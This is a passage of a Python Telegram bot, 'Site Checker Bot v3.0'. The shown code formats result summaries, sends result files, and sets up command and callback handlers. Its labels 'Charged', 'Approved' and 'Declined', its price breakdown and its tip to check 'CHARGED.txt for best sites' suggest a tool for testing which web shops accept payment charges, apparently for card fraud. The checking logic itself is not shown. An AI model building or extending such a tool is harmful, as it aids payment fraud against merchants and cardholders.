**📊 Summary:**
• Total Sites: {results['total']}
• 💎 Charged: {results['charged']}
• ✅ Approved: {results['approved']}
• ❌ Declined: {results['declined']}
• 💀 Dead: {results['dead']}
• ⚠️ Error: {results['error']}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**💰 Price Breakdown:**
"""
    total_with_price = sum(results['by_price'].values())
    if total_with_price > 0:
        sorted_categories = sorted(
            [(k, v) for k, v in results['by_price'].items() if v > 0],
            key=lambda x: x[0]
        )
        for category, count in sorted_categories:
            label = PRICE_CATEGORIES[category]['label']
            emoji = PRICE_CATEGORIES[category]['emoji']
            percentage = (count / total_with_price) * 100
            summary_text += f"\n  {emoji} {label}: {count} ({percentage:.1f}%)"
    else:
        summary_text += "\n  No price data available"

    summary_text += f"""

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**⏱️ Time Taken:** {time_taken:.2f} seconds

📁 **Sending files...**
"""
    
    await status_msg.edit_text(summary_text, parse_mode='Markdown')
    
    # =============================================
    # 2. Send Files
    # =============================================
    files = session.files
    
    # Send each file
    for filename, filepath in files.items():
        try:
            with open(filepath, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=filename,
                    caption=f"📄 {filename}"
                )
            await asyncio.sleep(0.5)  # Small delay between files
        except Exception as e:
            logger.error(f"Error sending file {filename}: {e}")
    
    # =============================================
    # 3. Send Final Message
    # =============================================
    final_text = """
🎉 **All Done!**

I've sent you the results as files.

**📁 Files received:**
• SUMMARY.txt - Complete statistics
• CHARGED.txt - 💎 Charged sites
• APPROVED.txt - ✅ Approved sites
• PRICE_*.txt - Sites by price range
• ALL_SITES.txt - Complete list

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**💡 Tips:**
• Check CHARGED.txt for best sites
• Use price files for specific budgets
• Share SUMMARY.txt for reference

**🔄 Want to check more?** Send your sites again!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Need help?** Contact @FROXT_07
"""
    
    keyboard = [
        [InlineKeyboardButton("🔍 Check Again", callback_data='check')],
        [InlineKeyboardButton("📊 Help", callback_data='help')]
    ]
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=final_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    
    # Clean up session
    session.status = 'idle'
    
    # Clean up temp files after 5 minutes
    async def cleanup():
        await asyncio.sleep(300)
        for filepath in files.values():
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
        # Remove directory
        try:
            dir_path = os.path.dirname(list(files.values())[0])
            os.rmdir(dir_path)
        except:
            pass
    
    asyncio.create_task(cleanup())

# =============================================
# CALLBACK HANDLERS
# =============================================

async def callback_handler(update: Update, context: CallbackContext):
    """
    Handle callback queries from inline buttons
    """
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == 'check':
        await check_command(query.message, context)
    elif data == 'help':
        await help_command(query.message, context)
    elif data == 'about':
        await about_command(query.message, context)
    elif data == 'stats':
        await stats_command(query.message, context)

# =============================================
# ERROR HANDLER
# =============================================

async def error_handler(update: Update, context: CallbackContext):
    """
    Handle errors
    """
    logger.error(f"Update {update} caused error {context.error}")
    logger.error(traceback.format_exc())
    
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An error occurred. Please try again later."
            )
    except:
        pass

# =============================================
# MAIN FUNCTION
# =============================================

def main():
    """
    Main entry point for the bot
    """
    print("\n" + "=" * 80)
    print(" 🤖 SITE CHECKER BOT v3.0")
    print("=" * 80)
    print(f" 📍 Bot Token: {BOT_TOKEN[:10]}...")
    print(f" 👤 Admins: {ADMIN_IDS if ADMIN_IDS else 'None'}")
    print("=" * 80)
    print(" ✅ Starting bot...")
    print("=" * 80)
    
    # Check token
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("\n❌ ERROR: BOT_TOKEN not set!")
        print("   Please set your bot token:")
        print("   1. In environment: export BOT_TOKEN='your_token'")
        print("   2. Or edit the file and set BOT_TOKEN")
        print("   Get token from @BotFather on Telegram")
        print("\n" + "=" * 80)
        sys.exit(1)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("about", about_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("check", check_command))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    # Start bot
    print("\n🚀 Bot is running!")
    print("📱 Press Ctrl+C to stop")
    print("=" * 80 + "\n")
    
    application.run_polling()

if __name__ == '__main__':
    main()
